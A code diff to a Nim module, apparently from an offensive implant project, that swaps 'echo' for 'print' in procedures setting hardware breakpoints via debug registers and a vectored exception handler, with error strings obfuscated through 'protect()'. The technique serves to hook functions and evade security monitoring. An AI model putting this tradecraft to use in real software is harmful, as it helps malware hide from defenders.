@@ -1,4 +1,5 @@
 import winim/lean
+import ./io
 import ../../common/utils
 
 # From: https://github.com/m4ul3r/malware/blob/main/nim/hardware_breakpoints/hardwarebreakpoints.nim
@@ -33,7 +34,7 @@ proc setHardwareBreakpoint*(pAddress: PVOID, fnHookFunc: PVOID, drx: DRX): bool 
     threadCtx.ContextFlags = CONTEXT_DEBUG_REGISTERS
 
     if GetThreadContext(cast[HANDLE](-2), threadCtx.addr) == 0:
-        echo protect("[!] GetThreadContext Failed: "), GetLastError()
+        print protect("[!] GetThreadContext Failed: "), GetLastError()
         return false
     
     case drx:
@@ -59,7 +60,7 @@ proc setHardwareBreakpoint*(pAddress: PVOID, fnHookFunc: PVOID, drx: DRX): bool 
     threadCtx.Dr7 = setDr7Bits(threadCtx.Dr7, (cast[int](drx) * 2), 1, 1)
 
     if SetThreadContext(cast[HANDLE](-2), threadCtx.addr) == 0:
-        echo protect("[!] SetThreadContext Failed: "), GetLastError()
+        print protect("[!] SetThreadContext Failed: "), GetLastError()
         return false
 
     return true
@@ -69,7 +70,7 @@ proc removeHardwareBreakpoint*(drx: DRX): bool =
     threadCtx.ContextFlags = CONTEXT_DEBUG_REGISTERS
 
     if GetThreadContext(cast[HANDLE](-2), threadCtx.addr) == 0:
-        echo protect("[!] GetThreadContext Failed: "), GetLastError()
+        print protect("[!] GetThreadContext Failed: "), GetLastError()
         return false
 
     # Remove the address of the hooked function from the thread context
@@ -87,7 +88,7 @@ proc removeHardwareBreakpoint*(drx: DRX): bool =
     threadCtx.Dr7 = setDr7Bits(threadCtx.Dr7, (cast[int](drx) * 2), 1, 0)
 
     if SetThreadContext(cast[HANDLE](-2), threadCtx.addr) == 0:
-        echo protect("[!] SetThreadContext Failed"), GetLastError()
+        print protect("[!] SetThreadContext Failed"), GetLastError()
         return false
 
     return true
@@ -196,7 +197,7 @@ proc initializeHardwareBPVariables*(): bool =
         # Add 'VectorHandler' as the VEH
         g_VectorHandler = AddVectoredExceptionHandler(1, cast[PVECTORED_EXCEPTION_HANDLER](vectorHandler))
         if cast[int](g_VectorHandler) == 0:
-            echo protect("[!] AddVectoredExceptionHandler Failed")
+            print protect("[!] AddVectoredExceptionHandler Failed")
             return false
     
     if (cast[int](g_VectorHandler) and cast[int](g_CriticalSection.DebugInfo)) != 0:
